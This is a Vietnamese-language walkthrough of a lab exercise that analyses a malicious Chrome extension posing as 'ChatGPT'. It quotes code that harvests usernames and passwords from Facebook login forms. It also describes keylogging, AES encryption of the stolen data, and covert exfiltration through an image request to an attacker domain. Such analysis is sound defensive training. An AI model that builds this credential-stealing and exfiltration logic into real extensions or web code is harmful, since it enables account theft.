**Introduce: Analyze a malicious Chrome extension's code and behavior to identify data theft mechanisms, covert exfiltration via `<img>` tags, and anti-analysis techniques.**

**Scenario: Your cybersecurity team has been alerted to suspicious activity on your organization's network. Several employees reported unusual behavior in their browsers after installing what they believed to be a helpful browser extension named "ChatGPT". However, strange things started happening: accounts were being compromised, and sensitive information appeared to be leaking.**

**Your task is to perform a thorough analysis of this extension identify its malicious components.**

Nhìn qua các file này, cho bạn nào chưa biết thì đây sẽ là một cấu trúc của một Chrome Extension sau khi được cài/giải nén:
-	Manifest.json: file bắt buộc, khai báo quyền, UI của extension
-	App.js, loader.js, crypto.js: đây tượng trưng cho javascript logic (có thể inject vào code hoặc chạy ngầm)
-	Ui.html: giao diện pop up khi chạy mở/chạy extension
-	Img.GIF: ảnh đi kèm (tài nguyên)

Thoạt nhìn thì có vẻ bình thường, có điều cấu trúc bình thường sẽ không đơn giản đến vậy. Không thấy thư mục rõ ràng như icons/, assests/.

ở phần khai báo hằng số có tên ‘targets’ có một đoạn bã base64 encode:

**d3d3LmZhY2Vib29rLmNvbQ==**

Mình đã decode và kết quả thu được là ‘www.facebook.com’. Mã độc này có vẻ như đang nhắm đến credentials của facebook.

Đi xuống một tí mình nhận thấy có một method addEventListener, bên trong có event ‘submit’. Kèm theo đó các đoạn code ở dưới như:

```javascript
let form = event.target;
        let formData = new FormData(form);
        let username = formData.get('username') || formData.get('email');
        let password = formData.get('password');
```

Điều này nhấn mạnh extension này ghi lại event ‘submit’ để theo dõi dữ liệu facebook của người dùng nhập vào thông qua các biểu mẫu bao gồm username, email, password.

--> Hậu quả khi chạy extension thì dữ liệu người dùng sẽ bị âm thầm ghi lại và gửi ra ngoài thông qua function ‘exfiltrateCredentials’ được gọi ngay bên dưới --> rò rỉ dữ liệu ngầm.

Không chỉ dừng lại ở event ‘submit’. Mã độc còn có cơ chế keylogger thông qua event ‘keydown’

Function này được gọi ngay trên part 1 mà chúng ta đã tìm hiểu. Cụ thể:
1.	Nhận dữ liệu nhạy cảm --> hàm được gọi khi đã có username + password
2.	Đóng gói (payload) --> gom thông tin thành 1 object: user + pass + site
3.	Mã hóa

    -> Convert sang string -> mã hóa bằng AES (ở hàm sendToServer)

    -> Encode base64

    Mục tiêu: che giấu nội dung khi gửi đi
4.	Exfiltration --> dữ liệu được gửi đến server attacker

Flow: credentials --> đóng gói --> mã hóa --> gửi về server attacker

Hiểu đơn giản function như sau:
-	Nhận dữ liệu
-	Mã hóa bằng AES (có salt là IV)
-	Ghép salt với dữ liệu mã hóa
-	Convert sang base64 để gửi đi

Flow: data -> tạo key + IV -> AES encrypt -> Ghép IV + ciphertext -> Encode Base64 -> output

Function then chốt để gửi data về server attacker thông qua thẻ **img**

Flow:

Payload -> encrypt -> encryptedData

->	EncodeURIComponent

->	Gắn vào URL (?data=…)

->	Img.src = URL -> browser tự gửi request

Điểm mấu chốt:
-	New Image() -> tạo request ngầm
-	Khi set: img.src = 'https://Mo.Elshaheedy.com/collect?data='

-> Browser tự động gửi request đến server attacker. Nhìn giống request để load ảnh nên sẽ khó bị phát hiện.

<br>

Đến đây chúng ta đã thu thập được các thông tin như:
-	Extension nhắm vào **đánh cắp tài khoản facebook** của người dùng.
-	Extension ghi lại sự kiện **submit** để theo dõi dữ liệu người dùng nhập vào thông qua các biểu mẫu.
-	Có cơ chế keylogger thông qua event **keydown** .
-	Thuật toán được sử dụng để bảo mật dữ liệu trước khi gửi đi là **AES**.
-	Extension sử dụng thẻ **img** của HTML để gửi dữ liệu đánh cắp được về server attacker có domain là **Mo.Elshaheedy.com**

Như vậy thông qua bài lab này, chúng ta đã tìm hiểu được:
-	Hiểu cấu trúc và cách hoạt động của **Chrome Extension (manifest, scripts, UI)**
-	Phân tích mã độc JS để phát hiện: 
    + **Credential harvesting** qua event submit 
    + Keylogger qua event **keydown** 
-	Nắm được kỹ thuật exfiltration ngầm qua thẻ **img** (bypass CORS, stealth) 
-	Hiểu cơ chế mã hóa dữ liệu trước khi gửi đi (AES + Base64 + IV) 
-	Nhận diện **anti-analysis techniques** (detect VM / headless browser) 
-	Hiểu cách malware: 
    + Load payload động (loader → core/app.js) 
    + Tách nhiều stage để né phân tích 
-	Phân tích permissions nguy hiểm trong manifest (cookies, webRequest, tabs)
